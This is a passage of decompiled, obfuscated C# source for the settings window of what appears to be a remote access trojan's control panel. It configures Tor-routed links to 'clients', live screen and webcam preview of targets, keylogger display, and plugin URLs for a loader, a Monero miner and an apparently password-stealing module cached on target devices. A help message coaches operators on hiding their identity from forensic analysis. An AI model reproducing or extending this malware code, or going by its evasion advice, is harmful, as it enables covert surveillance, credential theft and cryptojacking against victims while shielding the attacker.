        this.vmethod_234().MouseState = MouseStates.Normal;
        this.vmethod_234().Name = "btnFWSave";
        this.vmethod_234().Size = new Size(0x2f, 0x13);
        this.vmethod_234().TabIndex = 0x73;
        this.vmethod_234().Text = "Save";
        this.vmethod_234().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_234().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_234().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_234().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_234().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_234().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_234().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_234().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_236().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_236().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_236().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_236().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_236().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_236().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_236().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_236().Border.HoverVisible = true;
        this.vmethod_236().Border.Rounding = 6;
        this.vmethod_236().Border.Thickness = 1;
        this.vmethod_236().Border.Type = ShapeTypes.Rounded;
        this.vmethod_236().Border.Visible = true;
        this.vmethod_236().DialogResult = DialogResult.None;
        this.vmethod_236().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_236().Image = null;
        this.vmethod_236().Location = new Point(0xb5, 0xc2);
        this.vmethod_236().MouseState = MouseStates.Normal;
        this.vmethod_236().Name = "btnFWAdd";
        this.vmethod_236().Size = new Size(0x2f, 0x13);
        this.vmethod_236().TabIndex = 0x72;
        this.vmethod_236().Text = "Add";
        this.vmethod_236().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_236().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_236().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_236().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_236().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_236().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_236().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_236().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_238().Location = new Point(0x1b, 0xc2);
        this.vmethod_238().Margin = new Padding(1);
        this.vmethod_238().MaxLength = 0x27;
        this.vmethod_238().Name = "txtFWIP";
        this.vmethod_238().Size = new Size(150, 20);
        this.vmethod_238().TabIndex = 0x71;
        this.vmethod_240().AutoSize = true;
        this.vmethod_240().BackColor = Color.Transparent;
        this.vmethod_240().FlatStyle = FlatStyle.Flat;
        this.vmethod_240().Location = new Point(5, 0xc5);
        this.vmethod_240().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_240().Name = "lblFWIP";
        this.vmethod_240().Size = new Size(20, 13);
        this.vmethod_240().TabIndex = 0x70;
        this.vmethod_240().Text = "IP:";
        this.vmethod_240().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_174().Enabled = true;
        this.vmethod_226().Enabled = true;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x241, 0xfc);
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_4());
        this.DoubleBuffered = true;
        base.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        base.IsMdiContainer = true;
        base.Margin = new Padding(1);
        base.MaximizeBox = false;
        base.MinimizeBox = false;
        base.Name = "fSettings";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.Manual;
        this.Text = "Settings";
        base.TopMost = true;
        this.vmethod_6().ResumeLayout(false);
        this.vmethod_8().ResumeLayout(false);
        this.vmethod_8().PerformLayout();
        ((ISupportInitialize) this.vmethod_228()).EndInit();
        ((ISupportInitialize) this.vmethod_230()).EndInit();
        ((ISupportInitialize) this.vmethod_144()).EndInit();
        ((ISupportInitialize) this.vmethod_146()).EndInit();
        ((ISupportInitialize) this.vmethod_122()).EndInit();
        ((ISupportInitialize) this.vmethod_116()).EndInit();
        this.vmethod_26().ResumeLayout(false);
        this.vmethod_26().PerformLayout();
        ((ISupportInitialize) this.vmethod_164()).EndInit();
        ((ISupportInitialize) this.vmethod_160()).EndInit();
        ((ISupportInitialize) this.vmethod_48()).EndInit();
        ((ISupportInitialize) this.vmethod_34()).EndInit();
        this.vmethod_56().ResumeLayout(false);
        this.vmethod_56().PerformLayout();
        this.vmethod_104().EndInit();
        this.vmethod_72().EndInit();
        ((ISupportInitialize) this.vmethod_58()).EndInit();
        this.vmethod_36().ResumeLayout(false);
        this.vmethod_36().PerformLayout();
        ((ISupportInitialize) this.vmethod_112()).EndInit();
        this.vmethod_186().ResumeLayout(false);
        this.vmethod_186().PerformLayout();
        ((ISupportInitialize) this.vmethod_194()).EndInit();
        this.vmethod_202().ResumeLayout(false);
        this.vmethod_202().PerformLayout();
        ((ISupportInitialize) this.vmethod_220()).EndInit();
        ((ISupportInitialize) this.vmethod_214()).EndInit();
        this.vmethod_232().ResumeLayout(false);
        this.vmethod_232().PerformLayout();
        this.vmethod_244().EndInit();
        this.vmethod_252().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_242()).EndInit();
        base.ResumeLayout(false);
    }

    public void method_0(Form form_0)
    {
        this.fMain_0 = (fMain) form_0;
    }

    public void method_1()
    {
        if (this.vmethod_22().InvokeRequired)
        {
            this.vmethod_22().Invoke(new Delegate59(this.method_1), new object[0]);
        }
        else
        {
            this.vmethod_22().Text = Conversions.ToString(Class135.smethod_0().PortMain);
            this.vmethod_134().Text = Conversions.ToString(Class135.smethod_0().PortTor);
            this.vmethod_18().Text = Class135.smethod_0().Password;
            this.vmethod_14().Text = Class135.smethod_0().HostMainIP;
            this.vmethod_120().Text = Class135.smethod_0().NetworkBandwidth;
            this.vmethod_16().Checked = Class135.smethod_0().AutostartMain;
            this.vmethod_138().Checked = Class135.smethod_0().AutostartTor;
            this.vmethod_126().Text = Class135.smethod_0().PluginsURLLoader;
            this.vmethod_42().Text = Class135.smethod_0().PluginsURLXMR;
            this.vmethod_130().Text = Class135.smethod_0().PluginsURLXMR64;
            this.vmethod_44().Text = Class135.smethod_0().PluginsURLPws;
            this.vmethod_114().Checked = Class135.smethod_0().PluginsUpload;
            this.vmethod_262().Checked = Class135.smethod_0().PluginsSavePws;
            this.vmethod_60().Checked = Class135.smethod_0().PreviewEnabled;
            this.vmethod_66().Checked = Class135.smethod_0().PreviewSourceScreen;
            this.vmethod_62().Checked = Class135.smethod_0().PreviewSourceWebcam;
            this.vmethod_72().Value = Class135.smethod_0().PreviewUpdateInterval;
            this.vmethod_104().Value = Class135.smethod_0().PreviewQuality;
            this.vmethod_92().Text = Conversions.ToString(Class135.smethod_0().PreviewDefaultX);
            this.vmethod_86().Text = Conversions.ToString(Class135.smethod_0().PreviewDefaultY);
            this.vmethod_82().Text = Conversions.ToString(Class135.smethod_0().PreviewDoubleClickX);
            this.vmethod_76().Text = Conversions.ToString(Class135.smethod_0().PreviewDoubleClickY);
            this.vmethod_102().Checked = Class135.smethod_0().PreviewDisplayFrameData;
            this.vmethod_110().Checked = Class135.smethod_0().PreviewTransparentFrames;
            this.vmethod_190().Checked = Class135.smethod_0().ConNotifications;
            this.vmethod_188().Checked = Class135.smethod_0().Gridlines;
            this.vmethod_200().Checked = Class135.smethod_0().ConKlgColors;
            this.vmethod_258().Checked = Class135.smethod_0().SettingsTray;
            this.vmethod_264().Checked = Class135.smethod_0().UIThumbnails;
            this.vmethod_206().Checked = Class135.smethod_0().TorDisableCaching;
            this.vmethod_210().Checked = Class135.smethod_0().TorAvoidDiskWrites;
            this.vmethod_212().Checked = Class135.smethod_0().TorRejectSingleHop;
            this.vmethod_218().Checked = Class135.smethod_0().TorNoExec;
            this.vmethod_216().Checked = Class135.smethod_0().TorUseConstrainedSockets;
            this.vmethod_222().Text = Class135.smethod_0().TorConstrainedSocketSize;
            this.vmethod_106().Text = Conversions.ToString(this.vmethod_104().Value) + "%";
            this.vmethod_68().Text = Conversions.ToString(this.vmethod_72().Value) + " ms";
            if (Operators.CompareString(this.vmethod_126().Text, "URL to plugin: http://site.com/loader.plg", true) != 0)
            {
                Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
                this.vmethod_126().Font = font;
                this.vmethod_126().ForeColor = Color.Black;
            }
            if (Operators.CompareString(this.vmethod_44().Text, "URL to plugin: http://site.com/pws.plg", true) != 0)
            {
                Font font2 = new Font(this.vmethod_44().Font, FontStyle.Regular);
                this.vmethod_44().Font = font2;
                this.vmethod_44().ForeColor = Color.Black;
            }
            if (Operators.CompareString(this.vmethod_42().Text, "URL to plugin: http://site.com/xmr.plg", true) != 0)
            {
                Font font3 = new Font(this.vmethod_42().Font, FontStyle.Regular);
                this.vmethod_42().Font = font3;
                this.vmethod_42().ForeColor = Color.Black;
            }
            if (Operators.CompareString(this.vmethod_130().Text, "URL to plugin: http://site.com/xmr64.plg", true) != 0)
            {
                Font font4 = new Font(this.vmethod_130().Font, FontStyle.Regular);
                this.vmethod_130().Font = font4;
                this.vmethod_130().ForeColor = Color.Black;
            }
            this.vmethod_130().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
            this.vmethod_126().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
            this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
            this.vmethod_44().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
            this.vmethod_52().Text = Conversions.ToString(Class135.smethod_0().TransfersRecvBytes);
            this.vmethod_28().Text = Conversions.ToString(Class135.smethod_0().TransfersSendBytes);
            this.vmethod_140().Text = Conversions.ToString(Class135.smethod_0().TransfersConcurrentMax);
            this.vmethod_150().Text = Conversions.ToString(Class135.smethod_0().MaxBandwidthRateIn);
            this.vmethod_156().Text = Conversions.ToString(Class135.smethod_0().MaxBandwidthRateOut);
            this.vmethod_162().Checked = Class135.smethod_0().TransferReplaceExisting;
            this.vmethod_166().Checked = Class135.smethod_0().TransferReplaceFilesModified;
            this.vmethod_168().Checked = Class135.smethod_0().TransferReplaceFilesAll;
            if (Class130.struct18_0.method_0())
            {
                this.vmethod_170().Text = "Stop socket";
                this.vmethod_170().Refresh();
            }
            else
            {
                this.vmethod_170().Text = "Start socket";
                this.vmethod_170().Refresh();
            }
            if (Class130.struct18_1.method_0())
            {
                this.vmethod_172().Text = "Stop socket";
                this.vmethod_172().Refresh();
            }
            else
            {
                this.vmethod_172().Text = "Start socket";
                this.vmethod_172().Refresh();
            }
            int num3 = 10;
            while (true)
            {
                this.vmethod_98().Items.Add(Conversions.ToString(num3) + "%");
                num3 += 10;
                if (num3 > 100)
                {
                    int previewDefaultSize = Class135.smethod_0().PreviewDefaultSize;
                    if (previewDefaultSize <= 50)
                    {
                        if (previewDefaultSize <= 20)
                        {
                            if (previewDefaultSize == 10)
                            {
                                this.vmethod_98().SelectedItem = this.vmethod_98().Items[0];
                                break;
                            }
                            if (previewDefaultSize == 20)
                            {
                                this.vmethod_98().SelectedItem = this.vmethod_98().Items[1];
                                break;
                            }
                        }
                        else
                        {
                            if (previewDefaultSize == 30)
                            {
                                this.vmethod_98().SelectedItem = this.vmethod_98().Items[2];
                                break;
                            }
                            if (previewDefaultSize == 40)
                            {
                                this.vmethod_98().SelectedItem = this.vmethod_98().Items[3];
                                break;
                            }
                            if (previewDefaultSize == 50)
                            {
                                this.vmethod_98().SelectedItem = this.vmethod_98().Items[4];
                                break;
                            }
                        }
                    }
                    else if (previewDefaultSize <= 70)
                    {
                        if (previewDefaultSize == 60)
                        {
                            this.vmethod_98().SelectedItem = this.vmethod_98().Items[5];
                            break;
                        }
                        if (previewDefaultSize == 70)
                        {
                            this.vmethod_98().SelectedItem = this.vmethod_98().Items[6];
                            break;
                        }
                    }
                    else
                    {
                        if (previewDefaultSize == 80)
                        {
                            this.vmethod_98().SelectedItem = this.vmethod_98().Items[7];
                            break;
                        }
                        if (previewDefaultSize == 90)
                        {
                            this.vmethod_98().SelectedItem = this.vmethod_98().Items[8];
                            break;
                        }
                        if (previewDefaultSize == 100)
                        {
                            this.vmethod_98().SelectedItem = this.vmethod_98().Items[9];
                            break;
                        }
                    }
                    this.vmethod_98().SelectedItem = this.vmethod_98().Items[9];
                    break;
                }
            }
            int num4 = 10;
            while (true)
            {
                this.vmethod_94().Items.Add(Conversions.ToString(num4) + "%");
                num4 += 10;
                if (num4 > 100)
                {
                    int previewDoubleClickSize = Class135.smethod_0().PreviewDoubleClickSize;
                    if (previewDoubleClickSize <= 50)
                    {
                        if (previewDoubleClickSize <= 20)
                        {
                            if (previewDoubleClickSize == 10)
                            {
                                this.vmethod_94().SelectedItem = this.vmethod_94().Items[0];
                                break;
                            }
                            if (previewDoubleClickSize == 20)
                            {
                                this.vmethod_94().SelectedItem = this.vmethod_94().Items[1];
                                break;
                            }
                        }
                        else
                        {
                            if (previewDoubleClickSize == 30)
                            {
                                this.vmethod_94().SelectedItem = this.vmethod_94().Items[2];
                                break;
                            }
                            if (previewDoubleClickSize == 40)
                            {
                                this.vmethod_94().SelectedItem = this.vmethod_94().Items[3];
                                break;
                            }
                            if (previewDoubleClickSize == 50)
                            {
                                this.vmethod_94().SelectedItem = this.vmethod_94().Items[4];
                                break;
                            }
                        }
                    }
                    else if (previewDoubleClickSize <= 70)
                    {
                        if (previewDoubleClickSize == 60)
                        {
                            this.vmethod_94().SelectedItem = this.vmethod_94().Items[5];
                            break;
                        }
                        if (previewDoubleClickSize == 70)
                        {
                            this.vmethod_94().SelectedItem = this.vmethod_94().Items[6];
                            break;
                        }
                    }
                    else
                    {
                        if (previewDoubleClickSize == 80)
                        {
                            this.vmethod_94().SelectedItem = this.vmethod_94().Items[7];
                            break;
                        }
                        if (previewDoubleClickSize == 90)
                        {
                            this.vmethod_94().SelectedItem = this.vmethod_94().Items[8];
                            break;
                        }
                        if (previewDoubleClickSize == 100)
                        {
                            this.vmethod_94().SelectedItem = this.vmethod_94().Items[9];
                            break;
                        }
                    }
                    this.vmethod_94().SelectedItem = this.vmethod_94().Items[9];
                    break;
                }
            }
            this.vmethod_244().VirtualMode = true;
            this.vmethod_244().set_View(View.Details);
            this.vmethod_244().FullRowSelect = true;
            this.vmethod_244().set_OwnerDraw(true);
            this.vmethod_244().GridLines = Class135.smethod_0().Gridlines;
            fSettings settings = this;
            if (File.Exists(Application.StartupPath + @"\data\settings\firewall.txt"))
            {
                settings.vmethod_244().ClearObjects();
                Class130.concurrentDictionary_9.Clear();
                string[] strArray = Class136.smethod_3(Strings.Split(Class136.smethod_14(ref Application.StartupPath + @"\data\settings\firewall.txt"), "\r\n", -1, CompareMethod.Text));
                int num6 = strArray.Length - 1;
                for (int i = 0; i <= num6; i++)
                {
                    if (strArray[i].Length > 0)
                    {
                        cFWIP item = new cFWIP();
                        item.IP = strArray[i];
                        item.ATTEMPTS = Conversions.ToString(0);
                        Class130.concurrentQueue_0.Enqueue(item);
                        try
                        {
                            Class130.concurrentDictionary_9.TryAdd(strArray[i], item);
                        }
                        catch (Exception exception1)
                        {
                            Exception ex = exception1;
                            ProjectData.SetProjectError(ex);
                            Exception local2 = ex;
                            ProjectData.ClearProjectError();
                        }
                    }
                }
            }
            if (!settings.vmethod_250().IsBusy)
            {
                settings.vmethod_250().RunWorkerAsync();
            }
        }
    }

    private void method_10(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_44().Text, string.Empty, true) == 0)
        {
            this.vmethod_44().Text = "URL to plugin: http://site.com/pws.plg";
            this.vmethod_44().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_44().Font, FontStyle.Italic);
            this.vmethod_44().Font = font;
        }
    }

    private void method_11(object sender, EventArgs e)
    {
        this.vmethod_44().BackColor = Color.White;
        Font font = new Font(this.vmethod_44().Font, FontStyle.Regular);
        this.vmethod_44().Font = font;
    }

    private void method_12(object sender, EventArgs e)
    {
        this.vmethod_42().BackColor = Color.White;
        Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
        this.vmethod_42().Font = font;
    }

    private void method_13(object sender, EventArgs e)
    {
        Interaction.MsgBox("Value that specifies the size of the socket's receive-buffer.\r\n\r\nNote:\r\nA larger buffer size potentially reduces the number of empty acknowledgements (TCP packets with no data portion), but might also delay the recognition of connection difficulties. Consider increasing the buffer size if you are transferring large files, or you are using a high bandwidth, high latency connection (such as a satellite broadband provider).", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_14(object sender, EventArgs e)
    {
        Interaction.MsgBox("Value that specifies the size of the socket's send-buffer.\r\n\r\nNote:\r\nA larger buffer size potentially reduces the number of empty acknowledgements (TCP packets with no data portion), but might also delay the recognition of connection difficulties. Consider increasing the buffer size if you are transferring large files, or you are using a high bandwidth, high latency connection (such as a satellite broadband provider).", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_15(object sender, EventArgs e)
    {
        Interaction.MsgBox("If enabled, a frame will appear with live feed from the chosen source when selecting and hovering the client for at least 2 seconds.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_16(object sender, EventArgs e)
    {
        if (this.vmethod_60().Checked)
        {
            this.vmethod_66().Enabled = true;
            this.vmethod_62().Enabled = true;
            this.vmethod_72().Enabled = true;
        }
        else
        {
            this.vmethod_66().Enabled = false;
            this.vmethod_62().Enabled = false;
            this.vmethod_72().Enabled = false;
        }
    }

    private void method_17(object sender, EventArgs e)
    {
        this.vmethod_68().Text = Conversions.ToString(this.vmethod_72().Value) + " ms";
    }

    private void method_18(object sender, EventArgs e)
    {
        this.vmethod_106().Text = Conversions.ToString(this.vmethod_104().Value) + "%";
    }

    private void method_19(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_92().Text) | (Conversion.Val(this.vmethod_92().Text) < 128.0)) | (Conversion.Val(this.vmethod_92().Text) > 768.0))
        {
            this.vmethod_92().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_92().BackColor = Color.White;
        }
    }

    public void method_2()
    {
        if (Class130.struct18_0.method_0())
        {
            this.vmethod_170().Text = "Stop";
        }
        else
        {
            this.vmethod_170().Text = "Start";
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_86().Text) | (Conversion.Val(this.vmethod_86().Text) < 128.0)) | (Conversion.Val(this.vmethod_86().Text) > 1024.0))
        {
            this.vmethod_86().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_86().BackColor = Color.White;
        }
    }

    private void method_21(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_82().Text) | (Conversion.Val(this.vmethod_82().Text) < 128.0)) | (Conversion.Val(this.vmethod_82().Text) > 1920.0))
        {
            this.vmethod_82().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_82().BackColor = Color.White;
        }
    }

    private void method_22(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_76().Text) | (Conversion.Val(this.vmethod_76().Text) < 128.0)) | (Conversion.Val(this.vmethod_76().Text) > 1080.0))
        {
            this.vmethod_76().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_76().BackColor = Color.White;
        }
    }

    private void method_23(object sender, EventArgs e)
    {
        Interaction.MsgBox(@"If enabled, necesary plugins will be uploaded from data\plugins and cached on the target device.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_24(object sender, EventArgs e)
    {
        this.vmethod_126().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
        this.vmethod_42().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
        this.vmethod_130().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
        this.vmethod_44().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_114().Checked, false, true));
    }

    private void method_25(object sender, EventArgs e)
    {
        Interaction.MsgBox("All network interfaces are usually used for incoming connections. If an IP has been set, the relevant network interface will be used instead.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_26(object sender, EventArgs e)
    {
        Interaction.MsgBox("Enter an URL to any online speedtest file, preferably a minimum of 10MB.\r\n\r\nNote:\r\nThis feature is optional.\r\nOnly use HTTP protocol for URL, not HTTPS (SSL/TLS).", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_27(object sender, EventArgs e)
    {
        TextBox box;
        string text = (box = this.vmethod_120()).Text;
        ref string strRef = ref text;
        int num1 = (int) (false & Strings.LCase(strRef).StartsWith("https"));
        if (strRef.ToLower().StartsWith("www."))
        {
            strRef = "http://" + strRef;
        }
        bool flag = Regex.IsMatch(strRef, @"http(s)?://([\w+?\.\w+])+([a-zA-Z0-9\~\!\@\#\$\%\^\&\*\(\)_\-\=\+\\\/\?\.\:\;\'\,]*)?");
        box.Text = text;
        this.vmethod_120().BackColor = flag ? Color.White : Color.Red;
        if (this.vmethod_120().TextLength == 0)
        {
            this.vmethod_120().BackColor = Color.White;
        }
    }

    private void method_28(object sender, EventArgs e)
    {
        this.vmethod_126().BackColor = Color.White;
        Font font = new Font(this.vmethod_126().Font, FontStyle.Regular);
        this.vmethod_126().Font = font;
    }

    private void method_29(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_126().Text, "URL to plugin: http://site.com/loader.plg", true) == 0)
        {
            this.vmethod_126().Text = string.Empty;
            this.vmethod_126().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_126().Font, FontStyle.Regular);
            this.vmethod_126().Font = font;
        }
    }

    public void method_3()
    {
        base.Left = (int) Math.Round((double) ((Class130.fMain_0.Left + (((double) Class130.fMain_0.Width) / 2.0)) - (((double) base.Width) / 2.0)));
        base.Top = (int) Math.Round((double) ((Class130.fMain_0.Top + (((double) Class130.fMain_0.Height) / 2.0)) - (((double) base.Height) / 2.0)));
    }

    private void method_30(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_126().Text, string.Empty, true) == 0)
        {
            this.vmethod_126().Text = "URL to plugin: http://site.com/loader.plg";
            this.vmethod_126().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_126().Font, FontStyle.Italic);
            this.vmethod_126().Font = font;
        }
    }

    private void method_31(object sender, EventArgs e)
    {
        this.vmethod_130().BackColor = Color.White;
        Font font = new Font(this.vmethod_130().Font, FontStyle.Regular);
        this.vmethod_130().Font = font;
    }

    private void method_32(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_130().Text, "URL to plugin: http://site.com/xmr64.plg", true) == 0)
        {
            this.vmethod_130().Text = string.Empty;
            this.vmethod_130().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_130().Font, FontStyle.Regular);
            this.vmethod_130().Font = font;
        }
    }

    private void method_33(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_130().Text, string.Empty, true) == 0)
        {
            this.vmethod_130().Text = "URL to plugin: http://site.com/xmr64.plg";
            this.vmethod_130().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_130().Font, FontStyle.Italic);
            this.vmethod_130().Font = font;
        }
    }

    private void method_34(object sender, EventArgs e)
    {
        if (((!Versioned.IsNumeric(this.vmethod_22().Text) | (Conversion.Val(this.vmethod_22().Text) < 1.0)) | (Conversion.Val(this.vmethod_22().Text) > 65535.0)) | (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0))
        {
            this.vmethod_22().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_22().BackColor = Color.White;
        }
    }

    private void method_35(object sender, EventArgs e)
    {
        if (((!Versioned.IsNumeric(this.vmethod_134().Text) | (Conversion.Val(this.vmethod_134().Text) < 1.0)) | (Conversion.Val(this.vmethod_134().Text) > 65535.0)) | (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0))
        {
            this.vmethod_134().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_134().BackColor = Color.White;
        }
    }

    private void method_36(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_140().Text) | (Conversion.Val(this.vmethod_140().Text) < 1.0)) | (Conversion.Val(this.vmethod_140().Text) > 50.0))
        {
            this.vmethod_140().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_140().BackColor = Color.White;
        }
    }

    private void method_37(object sender, EventArgs e)
    {
        Interaction.MsgBox("This is the port to be used for secure and encrypted direct communications with your clients via SSL/TLS.\r\nMake sure that the port is unique and different from the ports in your settings.\r\n\r\nNOTE: This port has to be forwarded if you wish to use it!", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_38(object sender, EventArgs e)
    {
        Interaction.MsgBox("The Tor feature helps anonymizing data traffic between you and your clients by utilizing the Tor network.\r\n\r\nIf you decide to use the Tor feature for communication, your clients will be connected to a chain of random nodes of the Tor network whom forward the data traffic to you.\r\n\r\nUsing a Clearnet-based domain (instead of .onion) with your .exe, i.e. .com, .org, .net, etc. (especially from public services like dyndns, noip, duckdns, freedns, etc.) works perfectly fine and is sufficient in most cases without giving up too much performance, but could potentially reveal your identity by means of digital forensics/reverse engineering of your executable followed by further analysis.\r\n\r\nNOTE: Unless performance is a priority, it's highly recommended to follow the simple Tor hidden service configuration/setup in order to generate your own .onion address to be used with your .exe for enhanced anonymity and security. Using the Tor hidden service method (client connects to your .onion) requires no port forwarding.\r\n\r\nWARNING: Forwarding the Tor port when using a .onion address is dangerous and should be kept closed from public access (WAN). Leaving the port accessible from WAN may expose you to correlation attacks, which may reveal your IP.\r\n\r\nHowever, the Tor port should still be started when using a .onion address. This port is used only for local communication between Tor and " + Application.ProductName + ".", MsgBoxStyle.Information, Application.ProductName);
    }

    public void method_39()
    {
        Class130.fTorConfig_0.method_0(this.fMain_0);
        Class130.fTorConfig_0.Visible = true;
        bool flag = false;
        Form form2 = this;
        Form form = Class130.fTorConfig_0;
        Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
        form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
        if (flag)
        {
            form.Visible = true;
        }
    }

    private void method_4(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_28().Text) | (Conversion.Val(this.vmethod_28().Text) < 256.0)) | (Conversion.Val(this.vmethod_28().Text) > 65536.0))
        {
            this.vmethod_28().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_28().BackColor = Color.White;
        }
    }

    private void method_40(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_150().Text) | (Conversion.Val(this.vmethod_150().Text) > 2147483647.0)) | (((Conversion.Val(this.vmethod_150().Text) * 1024.0) < Conversion.Val(this.vmethod_28().Text)) & !(Conversion.Val(this.vmethod_150().Text) == 0.0)))
        {
            this.vmethod_150().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_150().BackColor = Color.White;
        }
    }

    private void method_41(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_156().Text) | (Conversion.Val(this.vmethod_156().Text) > 2147483647.0)) | (((Conversion.Val(this.vmethod_156().Text) * 1024.0) < Conversion.Val(this.vmethod_52().Text)) & !(Conversion.Val(this.vmethod_156().Text) == 0.0)))
        {
            this.vmethod_156().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_156().BackColor = Color.White;
        }
    }

    private void method_42(object sender, EventArgs e)
    {
        Interaction.MsgBox("Sets a bandwidth policy rate limit for all inbound transfers.\r\nNote: This policy governs all features.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_43(object sender, EventArgs e)
    {
        Interaction.MsgBox("Sets a bandwidth policy rate limit for all outbound transfers.\r\nNote: This policy governs all features.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_44(object sender, EventArgs e)
    {
        this.vmethod_168().Enabled = this.vmethod_162().Enabled;
        this.vmethod_166().Enabled = this.vmethod_162().Enabled;
    }

    private void method_45()
    {
        if (base.InvokeRequired)
        {
            base.Invoke(new Delegate61(this.method_45), new object[0]);
        }
        else
        {
            if (Class130.fSettings_0.Visible)
            {
                Class130.fSettings_0.TopMost = false;
            }
            Class130.fCertificate_0.Visible = true;
            bool flag = false;
            Form form2 = this;
            Form form = Class130.fCertificate_0;
            Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
            form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
            if (flag)
            {
                form.Visible = true;
            }
            Class130.fCertificate_0.Opacity = 100.0;
            Class130.fCertificate_0.Activate();
            Class130.fCertificate_0.method_0();
        }
    }

    private void method_46(object sender, EventArgs e)
    {
        this.vmethod_170().Enabled = false;
        if (Class130.struct18_0.method_0())
        {
            this.fMain_0.method_27();
            this.vmethod_170().Text = "Start socket";
        }
        else
        {
            TextBox box;
